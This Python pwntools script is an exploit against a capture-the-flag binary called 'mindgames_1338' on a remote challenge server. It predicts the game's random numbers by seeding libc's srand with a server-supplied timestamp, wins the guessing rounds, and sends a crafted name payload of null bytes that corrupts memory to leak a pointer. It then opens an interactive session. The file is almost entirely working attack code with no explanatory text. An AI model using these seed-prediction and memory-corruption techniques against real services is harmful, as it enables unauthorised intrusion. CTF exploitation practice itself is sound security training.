from pwn import *
import time
import ctypes
from dateutil import parser
import datetime, time
import getpass
from re import findall
from datetime import datetime

elf = ELF("./mindgames_1338")
context.binary=elf
lib=ctypes.CDLL('./libc')
#target=process([elf.path])
target=remote('pwn.institute',41336)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)


def sa(string,val):
	target.sendafter(string,val)

def play(n,payload):
	sla("> ",str(2))
	sla("Can you guess my numbers?\n> ",str(lib.rand()))
	for i in range(n-1):
		sla("You were lucky this time!\n>",str(lib.rand()))
	sla("You were lucky this time!\n>",str(lib.rand()-1))
	sa("Give me your name: ",payload)

def leaks():
	sla("> ",str(1))
	#target.recvuntil("Current highscore:\n%d\t by")
	leak=target.recv(0x21)[0x1b:0x21]
	return leak	

'''
junk=target.readuntil("It's ")
data=target.readuntil( ' and' )
date=parser.parse(data)
now=int((time.mktime(date.timetuple())))
lib.srand(now)
lib.rand()
lib.rand()
'''
strdate = findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", target.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()
lib.srand(int(epoch))
randv = lib.rand()
highscore = lib.rand()%32 + 1
payload="\x00"*0x28+"\x20"
play(0x20,payload)
leak=u64(leaks().ljust(8,"\x00"))
print(hex(leak))
target.interactive()
